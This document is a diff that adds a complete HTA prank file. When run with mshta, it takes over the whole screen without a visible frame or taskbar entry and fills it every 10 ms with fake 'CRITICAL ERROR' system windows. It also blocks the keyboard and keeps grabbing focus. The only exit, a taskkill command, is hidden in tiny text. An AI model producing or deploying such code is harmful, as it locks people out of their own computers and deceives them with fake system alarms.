@@ -1,0 +1,50 @@
+<html>
+<head>
+<hta:application id="oV" caption="no" sysmenu="no" border="none" scroll="no" showintaskbar="no" innerborder="no" />
+<style>
+    body { background-color: #ffffff; overflow: hidden; margin: 0; }
+    .win { 
+        position: absolute; width: 300px; height: 130px; 
+        background: #dfdfdf; border: 3px outset #fff; 
+        font-family: "Tahoma", sans-serif; box-shadow: 10px 10px 20px rgba(0,0,0,0.5);
+    }
+    .t { background: #000080; color: white; padding: 2px 8px; font-size: 11px; font-weight: bold; }
+    .c { padding: 25px; font-size: 14px; font-weight: bold; text-align: center; color: black; }
+</style>
+</head>
+<body onload="startBossMode()">
+
+<h6 style="font-size: 7px; font-weight: normal; margin: 5px; font-family: Tahoma, sans-serif;">напиши в win+r taskkill /f /im mshta.exe чтоби вийти!</h6>
+
+
+<script language="JavaScript">
+    var x = 50, y = 50;
+
+    function startBossMode() {
+        window.moveTo(0, 0);
+        window.resizeTo(screen.width, screen.height);
+        setInterval(spawn, 10); 
+        setInterval(function() { window.focus(); }, 1000); 
+    }
+
+    function spawn() {
+        var d = document.createElement("div");
+        d.className = "win";
+        d.style.left = x + "px";
+        d.style.top = y + "px";
+        d.innerHTML = '<div class="t">System Error</div><div class="c">CRITICAL ERROR</div>';
+        document.body.appendChild(d);
+
+        x += 45; 
+        y += 35;
+
+        if (x > screen.width - 300 || y > screen.height - 130) {
+            x = Math.random() * (screen.width - 300);
+            y = Math.random() * (screen.height / 2) + 50;
+        }
+    }
+
+    document.onkeydown = function() { return false; };
+</script>
+</body>
+</html>
